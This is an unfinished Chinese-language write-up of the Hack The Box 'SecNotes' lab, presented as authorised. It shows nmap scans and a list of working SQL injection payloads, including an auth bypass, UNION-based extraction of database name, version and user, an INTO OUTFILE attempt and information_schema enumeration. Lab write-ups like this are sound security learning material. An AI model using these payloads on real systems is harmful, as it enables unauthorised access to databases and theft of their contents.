# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

查看开放端口
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap --open 10.10.10.97 -p-                                                                               130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 22:58 EST
Nmap scan report for 10.10.10.97
Host is up (0.31s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 605.16 seconds

```

查看端口详细信息
```
┌──(root💀kali)-[~/htb/SecNotes]
└─# nmap -sV -Pn -A -O 10.10.10.97 -p 80,445,8808
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 23:36 EST
Nmap scan report for 10.10.10.97
Host is up (0.27s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-01-10T20:36:21-08:00
|_clock-skew: mean: 2h39m53s, deviation: 4h37m10s, median: -8s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-11T04:36:20
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   290.77 ms 10.10.14.1
2   290.96 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds

```



admin' or 1=1 #

admin ' union select 1,2,3,4# 
2, 3 ,4

admin ' union select 1,database(),3,version()#  
secnotes, 3 ,8.0.11

admin ' union select 1,system_user(), 3 ,user()# 
secnotes@localhost,3,secnotes@localhost

admin' union select 1,2,3,'test' into OUTFILE ''#


admin' union select 1,2,3,group_concat(distinct table_schema) from information_schema.tables#

